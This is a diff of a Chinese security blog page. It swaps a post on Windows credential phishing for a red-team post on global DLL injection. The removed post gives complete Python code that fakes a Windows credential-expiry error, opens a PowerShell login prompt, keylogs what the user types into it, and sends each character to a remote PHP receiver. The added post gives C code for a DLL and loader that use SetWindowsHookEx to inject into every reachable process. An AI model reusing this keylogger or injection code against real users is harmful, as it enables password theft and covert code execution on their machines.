@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>windows凭证钓鱼 | 九世的博客</title>
-  <meta name="keywords" content=" Writing ">
-  <meta name="description" content="windows凭证钓鱼 | 九世的博客">
+  <title>全局注入研究 | 九世的博客</title>
+  <meta name="keywords" content=" 红队 ">
+  <meta name="description" content="全局注入研究 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Become a hacker">
 <meta property="og:type" content="website">
@@ -1560,9 +1560,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-windows凭证钓鱼" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-全局注入研究" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">windows凭证钓鱼</h1>
+        <h1 class="article-title">全局注入研究</h1>
     
     <div class="article-meta">
         
@@ -1571,14 +1571,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color3">Writing</a>
+            <a href="javascript:" class="color3">红队</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-08-13 17:55:32">2019-08-13 17:45</time>
+        创建时间:<time class="date" title="更新时间: 2020-12-27 14:50:26">2020-12-27 14:33</time>
         
     </div>
     <div class="article-meta">
@@ -1600,7 +1600,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#环境"><span class="toc-text">环境</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接"><span class="toc-text">参考链接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#用到的API函数"><span class="toc-text">用到的API函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#实验"><span class="toc-text">实验</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1615,72 +1615,108 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在群里看见WBG老哥通过powershell来记录，windows凭证登录的用户名的和密码<br>当时就我凑了，看完gif后自己也想写一个<br><img src="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1565699852904&amp;di=73af6fe7fb5650178fcc87f189f65330&amp;imgtype=0&amp;src=http%3A%2F%2Fpic1.win4000.com%2Fwallpaper%2Ff%2F5744232793d1a.jpg" alt="timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1565699852904&amp;di=73af6fe7fb5650178fcc87f189f65330&amp;imgtype=0&amp;src=http%3A%2F%2Fpic1.win4000.com%2Fwallpaper%2Ff%2F5744232793d1a.jpg"></p>
-<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>需要用到的库：</p>
-<pre><code>pyHook
-pywin32
-pycom
-requests
-</code></pre><p>仓库地址：<br><a href="https://github.com/422926799/python/tree/master/windows%E5%87%AD%E8%AF%81%E6%8D%95%E8%8E%B7" target="_blank" rel="noopener">python/windows凭证捕获 at master · 422926799/python · GitHub</a></p>
-<p>思路：</p>
-<pre><code>弹出一个MSgbox提升用户凭证过期
-执行powershell命令要求输入凭证
-寻找到该窗体
-记录下键盘的输入
-发送到远程服务器
-</code></pre><p>代码：</p>
-<pre><code class="python">#@author:
-#@file:main.py
-import pythoncom, pyHook
-import pyHook
-from ctypes import *
-import requests
-import win32api
-import win32con
-import os
-import threading
-
-win32api.MessageBox(0,&quot;Windows凭证失效&quot;,&quot;Windows Error&quot;,win32con.MB_ICONERROR)
-os.popen(r&#39;&#39;&#39;powershell iex &quot;$creds = $host.ui.PromptForCredential(\&quot;Login Required\&quot;,\&quot;Enter username and password.\&quot;, \&quot;$env:username\&quot;,\&quot;NewBiosUserName\&quot;);&quot;&#39;&#39;&#39;)
-print(&#39;[+] windows凭证捕获&#39;)
-passwd=[]
-def OnKeyboardEvent(event):
-    windowTitle=create_string_buffer(512)
-    windll.user32.GetWindowTextA(event.Window,byref(windowTitle),512) #从窗体中获得窗体的title
-    windowname=windowTitle.value.decode(&#39;gbk&#39;)
-    if &#39;Login Required&#39;==windowname: #判断是否为登录窗体
-        key=chr(event.Ascii)
-        if key!=&#39;&#39;:
-            print(&#39;{}&#39;.format(key),end=&#39;&#39;)
-            passwd.append(key)
-        elif len(key)==0:
-            print(&#39;\n&#39;)
-# return True to pass the event to other handlers
-    return True
-
-def run():
-    # create a hook manager
-    hm = pyHook.HookManager()
-    # watch for all mouse events
-    hm.KeyDown = OnKeyboardEvent #设置事件过滤
-    # set the hook
-    hm.HookKeyboard()
-    # wait forever
-    print(&#39;键盘输入:&#39;)
-    pythoncom.PumpMessages()
-
-if __name__ == &#39;__main__&#39;:
-    t=threading.Thread(target=run,args=())
-    t.setDaemon(True)
-    t.start()
-    t.join(10)
-    for j in passwd:
-        if str(j)==&#39;\x00&#39; or str(j)==&#39;\t&#39;:
-            pass
-        else:
-            rqt=requests.get(url=&#39;http://127.0.0.1/jieshou.php?password={}&#39;.format(str(j)),headers={&#39;user-agent&#39;:&#39;nb&#39;}) #发送到远程服务器
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>昨天和朋友聊的时候聊到全局注入，今天打算复现一下</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>参考链接:<a href="https://www.cnblogs.com/DarkBright/p/10835761.html" target="_blank" rel="noopener">https://www.cnblogs.com/DarkBright/p/10835761.html</a></p>
+<h2 id="用到的API函数"><a href="#用到的API函数" class="headerlink" title="用到的API函数"></a>用到的API函数</h2><p>GetMsgProc<br>GetMsgProc与SetWindowsHookEx函数一起使用的应用程序定义或库定义的回调函数。每当GetMessage或PeekMessage函数从应用程序消息队列中检索消息时，系统就会调用此函数。在将检索到的消息返回给调用者之前，系统会将消息传递给挂钩过程。<br><a href="https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/ms644981(v=vs.85)" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/ms644981(v=vs.85)</a></p>
+<p>SetWindowsHookExA<br>将应用程序定义的挂钩过程安装到挂钩链中。您将安装一个挂钩过程来监视系统中的某些类型的事件。这些事件与特定线程或与调用线程在同一桌面上的所有线程相关联。<br><a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexa" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexa</a></p>
+<p>UnhookWindowsHookEx<br>删除通过SetWindowsHookEx函数安装在挂钩链中的挂钩过程。<br><a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-unhookwindowshookex" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-unhookwindowshookex</a></p>
+<h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><p>整体思路：</p>
+<pre><code>1. 声明钩子返回的函数即为GetMsgProc
+2. 设置钩子要钩住的的事件类型
+3. 定义要执行的函数
+4. DLLMain载入DLL的时候定义要执行的code
+5. 调用dll的LoadHook函数钩住
+6. 然后dll的HookLoad函数
+7. 由于载入DLL的时候会先执行DLLMain，所以当前进程会执行DLLMain然后在调用钩子钩住对应的类型，然后在注入dll
+8. 根据需求卸载钩子
+</code></pre><p>test.dll<br>导出的函数</p>
+<pre><code>* LoadHook
+* UnloadHook
+</code></pre><pre><code class="C">#include &quot;stdafx.h&quot;
+#include &lt;Windows.h&gt;
+HHOOK g_hook;
+HMODULE g_module;
+extern &quot;C&quot; {
+        __declspec(dllexport) BOOL LoadHook();
+}
+extern &quot;C&quot; {
+        __declspec(dllexport) VOID UnloadHook();
+}
+LRESULT CALLBACK GetMsgProc(
+        _In_ int    code,
+        _In_ WPARAM wParam,
+        _In_ LPARAM lParam
+) {
+        return CallNextHookEx(g_hook, code, wParam, lParam);
+}
+BOOL LoadHook(void) {
+        g_hook = SetWindowsHookEx(WH_GETMESSAGE, (HOOKPROC)GetMsgProc, g_module, 0);
+        if (g_hook) {
+               MessageBoxA(NULL, &quot;Sucess&quot;, 0, MB_OK);
+               return TRUE;
+        }
+        else {
+               return FALSE;
+        }
+}
+VOID UnloadHook(void) {
+        if (g_hook) {
+               UnhookWindowsHookEx(g_hook);
+        }
+}
+BOOL APIENTRY DllMain(HMODULE hModule,
+        DWORD  ul_reason_for_call,
+        LPVOID lpReserved
+)
+{
+        switch (ul_reason_for_call)
+        {
+        case DLL_PROCESS_ATTACH:
+               g_module = hModule;
+               MessageBox(NULL, TEXT(&quot;加载DLL!&quot;), TEXT(&quot;提示&quot;), MB_OK);
+               break;
+        case DLL_THREAD_ATTACH:
+        case DLL_THREAD_DETACH:
+        case DLL_PROCESS_DETACH:
+               break;
+        }
+        return TRUE;
+}
 </code></pre>
-<p>效果图<br><img src="https://camo.githubusercontent.com/4bae8e67d066491583907c9a13c870955120e9e2/68747470733a2f2f73322e617831782e636f6d2f323031392f30382f31332f6d70686575642e676966" alt="68747470733a2f2f73322e617831782e636f6d2f323031392f30382f31332f6d70686575642e676966"></p>
+<p>inject.exe</p>
+<pre><code class="C">#include &quot;stdafx.h&quot;
+#include &lt;Windows.h&gt;
+#define DLL_NAME &quot;test.dll&quot;
+#define error(name){printf(&quot;Error:%s code:%d&quot;,name,GetLastError());}
+int main() {
+        do {
+               HMODULE hModule = LoadLibraryA(DLL_NAME);
+               if (hModule == NULL) {
+                       error(&quot;LoadLibraryA&quot;);
+                       break;
+               }
+               FARPROC pfnLoadHook = GetProcAddress(hModule,&quot;LoadHook&quot;);
+               FARPROC pfnUnLoadHook = GetProcAddress(hModule, &quot;UnloadHook&quot;);
+               if (pfnLoadHook == NULL || pfnUnLoadHook == NULL) {
+                       error(&quot;GetProcAddress&quot;);
+                       break;
+               }
+               if (pfnLoadHook()) {
+                       printf(&quot;global inject sucess!&quot;);
+               }else {
+                       printf(&quot;global inject failure&quot;);
+                       break;
+               }
+               printf(&quot;Enter UnloadHook&quot;);
+               getchar();
+               pfnUnLoadHook();
+        } while (FALSE);
+        getchar();
+        return 0;
+}
+</code></pre>
+<p>在当前权限所允许的情况下，会多所有能访问的进程钩住注入dll<br><img src="https://s3.ax1x.com/2020/12/27/r56jvn.png" alt=""></p>
+<p><img src="https://s3.ax1x.com/2020/12/27/r5c32d.png" alt=""></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -1690,12 +1726,12 @@ if __name__ == &#39;__main__&#39;:
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>windows凭证钓鱼</p>
+    <p><span class="copy-title">文章标题:</span>全局注入研究</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-08-13, 17:45:23</p>
-    <p><span class="copy-title">最后更新:</span>2019-08-13, 17:55:32</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/1441cb97.html" title="windows凭证钓鱼">http://422926799.github.io/posts/1441cb97.html</a>
+    <p><span class="copy-title">发布时间:</span>2020-12-27, 14:33:16</p>
+    <p><span class="copy-title">最后更新:</span>2020-12-27, 14:50:26</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/8bc59822.html" title="全局注入研究">http://422926799.github.io/posts/8bc59822.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
